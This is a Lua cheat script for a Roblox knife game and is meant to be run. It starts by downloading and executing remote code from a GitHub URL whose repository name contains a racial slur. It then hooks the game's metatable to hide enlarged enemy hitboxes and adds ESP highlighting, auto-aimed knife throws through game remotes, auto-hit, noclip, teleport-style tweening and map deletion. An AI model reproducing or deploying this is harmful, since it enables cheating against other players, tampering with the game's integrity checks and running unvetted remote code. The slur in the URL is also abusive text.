_G.script = true



        spawn(function()
            game:GetService('RunService').RenderStepped:connect(function()
                pcall(function()
                    if _G.script then
                       
                            


loadstring(game:HttpGet("https://raw.githubusercontent.com/helloDelvuss/NIGGARTX/main/EZRTX",true))();

task.spawn(function()
    game:GetService("RunService").Heartbeat:connect(function()
    game.Workspace.GameMap:Destroy()
    end)
 end)   

task.spawn(function()
    game:GetService("RunService").Heartbeat:connect(function()
    Workspace.CurrentCamera.FieldOfView = 100
    end)
 end)

getfenv().hbe = true
    if getfenv().hbe == true then
    local mt = getrawmetatable(game);
    make_writeable(mt);
    local old_index = mt.__index;
    
    mt.__index = function(a, b)
    if tostring(a) == "HumanoidRootPart" then
    if tostring(b) == "Size" then
    return Vector3.new(2, 2, 1);
    end
    end
    return old_index(a, b);
    end
    
    
    if shared.ShushHighlight then shared.ShushHighlight.stop();end;
    
    local Connection = {};
    Connection.__index = Connection;
    Connection.__tostring = function(self)
        return self.Name;
    end;
    
    Connection.new = function(Event, Func, Once)
        return setmetatable({Name = Event.Name .. ".Connection", Event = Event, Func = Func, Once = Once}, Connection);
    end;
    
    Connection.Disconnect = function(self)
        table.remove(self.Event._connections, table.find(self.Event._connections, self));
    end;
    
    
    local Event = {};
    Event.__index = Event;
    Event.__tostring = function(self)
        return self.Name;
    end;
    
    Event.new = function(Name)
        return setmetatable({Name = Name or "Event", _connections={}, _waits={}}, Event);
    end;
    
    Event.Connect = function(self, Func)
        local connection = Connection.new(self, Func);
        table.insert(self._connections, connection);
        return connection;
    end;
    Event.Fire = function(self, ...)
        local Args = {...};
        task.spawn(function()
            for I, Con in next, self._connections do
                Con.Func(unpack(Args));
            end;
        end);
    end;
    
    
    local Target;
    
    local PlayerService = game:GetService("Players");
    local LP = PlayerService.LocalPlayer;
    
    local FFC = game.FindFirstChild;
    
    local TargetObject = LP:WaitForChild("PlayerGui").ScreenGui.UI.Target;
    local TargetText = TargetObject.TargetText;
    
    do
        local T = TargetText.Text;
        local V = TargetText.Visible;
        local V2 = TargetObject.Visible;
    
        if V and V2 then
            if T and #T > 1 then
                Target = FFC(PlayerService, T);
            end;
        end;
    end;
    
    local INSTChanged = Event.new("InstChanged");
    local TARGETChanged = Event.new("TargetChanged");
    local HITBOXChanged = Event.new("HitboxChanged");
    local TARGETHITBOXChanged = Event.new("TargetHitboxChanged");
    
    local SettingsProxy = {Target = true};
    
    local INSTProxy = {
        FillColor = Color3.new(0, 1, 0),
        FillTransparency = 0.5,
    
        OutlineColor = Color3.new(1, 1, 1),
        OutlineTransparency = 0;
    };
    local TARGETProxy = {
        FillColor = Color3.new(1, 0, 0),
        FillTransparency = 0.5,
    
        OutlineColor = Color3.new(1, 1, 1),
        OutlineTransparency = 0;
    };
    local HITBOXProxy = {
        Size = Vector3.new(2,2,1),
        Transparency = 1
    };
    local TARGETHITBOXProxy = {
        Size = Vector3.new(2,2,1),
        Transparency = 1
    };
    
    local Settings = setmetatable({}, {__index = SettingsProxy, __newindex = function(self, key, value)
        if key == "Target" then 
            for i,v in next, TARGETProxy do
                TARGETChanged:Fire(i,v);
            end;
        end;
        
        SettingsProxy[key] = value;
    end});
    Settings.INST = setmetatable({}, {__index = INSTProxy, __newindex = function(self, Key, Value)
        if INSTProxy[Key] then
            INSTChanged:Fire(Key, Value);
            INSTProxy[Key] = Value;
            
            return;
        end;
        
        return error(tostring(Key), " is not a valid key");
    end});
    Settings.TARGET = setmetatable({}, {__index = TARGETProxy, __newindex = function(self, Key, Value)
        if TARGETProxy[Key] then
            TARGETChanged:Fire(Key, Value);
            TARGETProxy[Key] = Value;
            
            return;
        end;
        
        return error(tostring(Key), " is not a valid key");
    end});
    Settings.HITBOX = setmetatable({}, {__index = HITBOXProxy, __newindex = function(self, Key, Value)
        if HITBOXProxy[Key] then
            HITBOXChanged:Fire(Key, Value);
            HITBOXProxy[Key] = Value;
            
            return;
        end;
        
        return error(tostring(Key), " is not a valid key");
    end});
    Settings.TARGETHITBOX = setmetatable({}, {__index = TARGETHITBOXProxy, __newindex = function(self, Key, Value)
        if TARGETHITBOXProxy[Key] then
            TARGETHITBOXChanged:Fire(Key, Value);
            TARGETHITBOXProxy[Key] = Value;
            
            return;
        end;
        
        return error(tostring(Key), " is not a valid key");
    end});
    
    local Highlight = {
        Active = true,
        Connections = {},
        Settings = Settings
    };
    Highlight.__index = Highlight;
    
    Highlight.new = function(Character, Player)
        local cache = {};
        
        local Inst = Instance.new("Highlight");
        Inst.Adornee = Character;
        Inst.Parent = Character;
        
        if Settings.Target and Target and Player == Target then
            for k,v in next, TARGETProxy do
                Inst[k] = v;
                cache[k] = v;
            end;
        else
            for k, v in next, INSTProxy do
                Inst[k] = v;
                cache[k] = v;
            end;
        end;
        
        local SettingsCon; SettingsCon = INSTChanged:Connect(function(k,v)
            if cache[k] == v then return;end;
            if Settings.Target and Target and Target and Player == Target then return;end;
            Inst[k] = v;
            -- cache[k] = v;
        end);
        local TargetCon; TargetCon = TARGETChanged:Connect(function(k,v)
            if cache[k] == v then return;end;
            if not (Settings.Target and Target and Player == Target) then return;end;
            Inst[k] = v;
            -- cache[k] = v;
        end);
        Inst.Changed:Connect(function(P)
            cache[P] = Inst[P];
        end);
    
        
        local highlight = setmetatable({
            Active = true,
            Inst = Inst,
            Character = Character,
            SettingsCon = SettingsCon,
            TargetCon = TargetCon;
        }, Highlight);
        
        return highlight;
    end;
    
    Highlight.Destroy = function(self)
        if not self.Active then return;end;
        self.Active = false;
        self.SettingsCon:Disconnect();
        self.TargetCon:Disconnect();
        self.Inst:Destroy();
    end;
    
    local Extender = {};
    Extender.__index = Extender;
    
    Extender.new = function(Character, Player)
        local HRP = Character:FindFirstChild("HumanoidRootPart");
        
        local HitboxCon = HITBOXChanged:Connect(function(k,v)
            if not HRP then return;end;
            if Settings.Target and Target and Target and Player == Target then return;end;
            HRP[k] = v;
        end);
        local TargetHitboxCon = TARGETHITBOXChanged:Connect(function(k,v)
            if not HRP then return;end;
            if not (Settings.Target and Target and Target and Player == Target) then return;end;
            HRP[k] = v;
        end);
    
        local extender = setmetatable({
            Active = true,
            HitboxCon = HitboxCon,
            TargetHitboxCon = TargetHitboxCon,
            HRP = HRP,
        }, Extender);
    
        task.spawn(function()
            if not HRP then repeat task.wait();HRP = Character:FindFirstChild("HumanoidRootPart");until HRP;end;
            extender.HRP = HRP;
    
            if Settings.Target and Target and Player == Target then
                for k,v in next, TARGETHITBOXProxy do
                    HRP[k] = v;
                end;
            else
                for k, v in next, HITBOXProxy do
                    HRP[k] = v;
                end;
            end;
        end);
    
        return extender;
    end;
    Extender.Destroy = function(self)
        if not self.Active then return;end;
        self.Active = false;
        self.HitboxCon:Disconnect();
        self.TargetHitboxCon:Disconnect();
    end;
    
    local function GetCharacter(Player)
        return workspace:FindFirstChild(Player.Name);
    end;
    
    local PlayerObject = {};
    PlayerObject.__index = PlayerObject;
    
    PlayerObject.new = function(Player)
        if typeof(Player) ~= "Instance" or Player == LP then return;end;
        local playerobject = setmetatable({
            Active = true,
            Player = Player,
            Character = GetCharacter(Player) or Player.CharacterAdded:Wait();
        }, PlayerObject);
    
        task.spawn(function()
            playerobject.Highlight = Highlight.new(playerobject.Character, Player);
        end);
        task.spawn(function()
            playerobject.Extender = Extender.new(playerobject.Character, Player);
        end);
    
        local con = Player.CharacterAdded:Connect(function(Character)
            task.spawn(function()
                if playerobject.Highlight then playerobject.Highlight:Destroy();end;
                playerobject.Highlight = Highlight.new(Character, Player);
            end);
            task.spawn(function()
                if playerobject.Extender then playerobject.Extender:Destroy();end;
                playerobject.Extender = Extender.new(Character, Player);
            end);
        end);
        playerobject.CharacterAddedCon = con;
    
        PlayerObject[Player] = playerobject;
    
        return playerobject;
    end;
    
    PlayerObject.Destroy = function(self)
        if not self.Active then return;end;
        
        self.Active = false;
        if self.Highlight then self.Highlight:Destroy();end;
        if self.Extender then self.Extender:Destroy();end;
        self.CharacterAddedCon:Disconnect();
        
    end;
    
    Highlight.HandlePlayers = function()
        for I, Player in next, PlayerService:GetPlayers() do
            PlayerObject.new(Player);
        end;
    
        table.insert(Highlight.Connections, PlayerService.PlayerAdded:Connect(PlayerObject.new));
        table.insert(Highlight.Connections, PlayerService.PlayerRemoving:Connect(function(Player)
            if PlayerObject[Player] then
                PlayerObject[Player]:Destroy();
            end;
        end));
    end;
    Highlight.stop = function()
        if not Highlight.Active then return;end;
        
        Highlight.Active = false;
        for I, V in next, PlayerObject do
            if typeof(I) == "Instance" then
                V:Destroy();
            end;
        end;
        
        for i,v in next, Highlight.Connections do
            v:Disconnect();
        end;
    end;
    
    local ReplicatedStorage = game:GetService("ReplicatedStorage");
    local Remotes = ReplicatedStorage.Remotes;
    local HideTarget = Remotes.HideTarget;
    local UpdateTarget = Remotes.UpdateTarget;
    
    table.insert(Highlight.Connections, HideTarget.OnClientEvent:Connect(function()
        Target = nil;
    
        for k,v in next, INSTProxy do
            INSTChanged:Fire(k,v);
        end;
    end));
    table.insert(Highlight.Connections, UpdateTarget.OnClientEvent:Connect(function(T)
        Target = T;
    
        local p = PlayerObject[Target]
        local h = p and p.Highlight;
        
        if h then
            for k,v in next, TARGETProxy do
                h.Inst[k] = v;
            end;
        end;
    
        local e = p and p.Extender;
        if e then
            for k,v in next, TARGETHITBOXProxy do
                e.HRP[k] = v;
            end;
        end;
    end));
    
    Highlight.HandlePlayers();
    shared.ShushHighlight = Highlight;
    local Settings = shared.ShushHighlight.Settings;
    
    Settings.HITBOX.Size = Vector3.new(15,15,15);
    Settings.HITBOX.Transparency = 0.5;
    Settings.TARGETHITBOX.Size = Vector3.new(25,25,25);
    Settings.TARGETHITBOX.Transparency = 0.5;
    
    Settings.INST.FillColor = Color3.fromRGB(0, 0, 0);
    Settings.TARGET.OutlineColor = Color3.fromRGB(0, 0, 0);
    elseif getfenv().hbe == false then
        print('disabled hbe')
    end

game:GetService("AdService"):ClearAllChildren()
wait(1)

    local Player = game.Players.LocalPlayer
    local wS = game.Workspace
    local cam = wS.CurrentCamera
    local mouse = Player:GetMouse()
    local ClosestPlr = function()
        local Closest = nil
        local Distance = 9e9;
        for i,v in pairs(game.Players:GetPlayers()) do
            if v ~= Player then
                if wS[v.Name]:FindFirstChild("Humanoid") and wS[v.Name].Humanoid.Health ~= 0 then
                    local pos = cam:WorldToViewportPoint(wS[v.Name].HumanoidRootPart.Position)
                    local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(mouse.X, mouse.Y)).magnitude;
                    if magnitude < Distance then
                        Closest = wS[v.Name]
                        Distance = magnitude
                    end
                end
            end
        end
        return Closest
    end
    
    game:GetService('RunService').RenderStepped:connect(function()
        for i,v in pairs(game.Workspace.KnifeHost:GetDescendants()) do
            if v:IsA"Part" then
                if v.Archivable == true then
                    local plrpos  = ClosestPlr().baseHitbox.CFrame
                    v.CFrame = plrpos
                end
            end
        end
    end)
    
    game:GetService("RunService").Stepped:Connect(function()
        local function randompart()
            local hits = {
                0,
                1,
                2,
                -1,
                -2,
            }
            return hits[math.random(1, #hits)]
        end
                if game.Players.LocalPlayer.Backpack:FindFirstChild("Knife") then
                    for i, v in pairs(game.Players:GetPlayers()) do
                        if v.Name == game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.UI.Target.TargetText.Text then
                            if v.Name ~= game.Players.LocalPlayer.Name then
                                game.Players.LocalPlayer.Character.Humanoid:EquipTool(Game.Players.LocalPlayer.Backpack.Knife)
                                wait(.3)
                                local Target = game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.UI.Target.TargetText.Text
                                local x = game.Workspace[Target].HumanoidRootPart.Position.X + randompart()
                                local y = game.Workspace[Target].HumanoidRootPart.Position.Y + randompart()
                                local z = game.Workspace[Target].HumanoidRootPart.Position.Z + randompart()
                                local args = {
                                    [1] = Vector3.new(x, y, z),
                                    [2] = 0,
                                    [3] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
                                }
                                game:GetService("ReplicatedStorage").Remotes.ThrowKnife:FireServer(unpack(args))
                                wait(.1)
                                game:GetService("Players").localPlayer.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
                                wait(.6)
                            end
                        end
                    end
                end
    end)

function GetTime(Distance, Speed)
    local Time = Distance / Speed
    return Time
end

function oreoTween(targetpart,oreospeed)
    local Speed = oreospeed  local Distance = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - targetpart.Position).magnitude local Time = GetTime(Distance, Speed) local TweenService = game:GetService("TweenService") local oreottable = TweenInfo.new( Time, Enum.EasingStyle.Linear, Enum.EasingDirection.Out,  0, false, 0 ) local Tween = TweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart,oreottable,{CFrame = targetpart.CFrame}) Tween:Play()
end
local ClosestPlayer = function()
    local Closest = nil
    local Distance = 9e9
    for i, v in next, game:GetService("Players"):GetPlayers() do
        if v.Name ~= Player.Name then
            if wS[v.Name] and wS[v.Name]:FindFirstChild("Humanoid") and wS[v.Name]:FindFirstChild("Humanoid").Health ~= 0 then
                local Magnitude = (Player.Character.Head.Position - wS[v.Name].Head.Position).Magnitude
                if Magnitude < Distance then
                    Closest = wS[v.Name]
                    Distance = Magnitude
                    end
                end
            end
        end
    return Closest
end
local cooldown = false

task.spawn(function()
    game:GetService("RunService").Heartbeat:connect(function()
        if Player.Character and not cooldown then
            if Player:DistanceFromCharacter(ClosestPlayer().Head.Position) <= 7.5 then
                Player.PlayerScripts.localknifehandler.HitCheck:Fire(ClosestPlayer())
                coroutine.wrap(function()
                    cooldown = true
                    task.wait(.9)
                    cooldown = false
                end)()
            else
                task.wait()
            end
        end
    end)
end)
game:GetService("RunService").Stepped:Connect(function()
game.Workspace.Gravity = -2
game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
    oreoTween(game.Workspace[game.Players.LocalPlayer.PlayerGui.ScreenGui:WaitForChild("UI"):WaitForChild("Target"):WaitForChild("TargetText").Text].HumanoidRootPart,24)
    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
        pcall(function()
            if v.ClassName == "Part" then
                v.CanCollide = false
            elseif v.ClassName == "Model" then
                v.Head.CanCollide = false
            end
        end)
    end
end)



task.spawn(function()
    game.RunService.Heartbeat:Connect(function()
        for i,v in pairs(game:GetService('Players'):GetChildren()) do
   AnimationId = "282574440"
   local Anim = Instance.new("Animation")
   Anim.AnimationId = "rbxassetid://"..AnimationId
   local animplay = game:GetService('Players').LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
   animplay:Play()
   animplay:AdjustSpeed(2)
end
end)
end)
                        
                        
                    end
                end)
            end)
        end)







  








